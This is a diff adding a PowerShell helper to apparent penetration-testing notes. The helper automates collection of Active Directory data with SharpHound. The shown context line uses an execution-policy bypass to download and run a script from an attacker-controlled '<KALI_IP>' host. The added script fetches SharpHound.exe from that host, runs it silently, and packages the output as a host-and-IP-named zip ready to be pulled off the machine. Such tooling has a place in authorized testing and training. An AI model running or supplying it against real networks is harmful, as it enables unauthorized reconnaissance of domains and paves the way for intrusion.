@@ -14,3 +14,46 @@ When on a windows machine and have admin, the idea of downloading and running sh
 powershell -ep bypass -c "IWR http://<KALI_IP>/auto_sharphound.ps1 -OutFile auto_sharphound.ps1; .\auto_sharphound <KALI_IP>"
 ```
 
+```powershell
+# auto.ps1 - With your requested status messages
+
+param([string]$KaliIP)
+
+if (-not $KaliIP) { exit }
+
+$ExeName = "SharpHound.exe"
+$KaliUrl = "http://$KaliIP/$ExeName"
+
+Write-Host "[+] Downloading Sharphound"
+
+# Download to current directory
+Invoke-WebRequest -Uri $KaliUrl -OutFile $ExeName -UseBasicParsing -ErrorAction SilentlyContinue
+
+if (Test-Path $ExeName) {
+    $HostName = $env:COMPUTERNAME
+    $IP = (Get-NetIPAddress -AddressFamily IPv4 | 
+           Where-Object { $_.InterfaceAlias -notlike "*Loopback*" -and 
+                          $_.IPAddress -notlike "169.*" -and 
+                          $_.IPAddress -notlike "127.*" } | 
+           Select-Object -First 1).IPAddress
+
+    Write-Host "[+] Executing Sharphound on $HostName // $IP"
+
+    # Run SharpHound (default collection + zip in current dir)
+    & ".\$ExeName" 2>$null >$null
+
+    # Find the newest .zip file
+    $NewestZip = Get-ChildItem -Path . -Filter *.zip | 
+                 Sort-Object LastWriteTime -Descending | 
+                 Select-Object -First 1
+
+    if ($NewestZip) {
+        $NewName = "${HostName}_${IP}.zip"
+        
+        Rename-Item -Path $NewestZip.FullName -NewName $NewName -ErrorAction SilentlyContinue
+        
+        Write-Host "[+] Renaming $($NewestZip.Name)"
+        Write-Host "[+] $NewName ready to download"
+    }
+}
+```
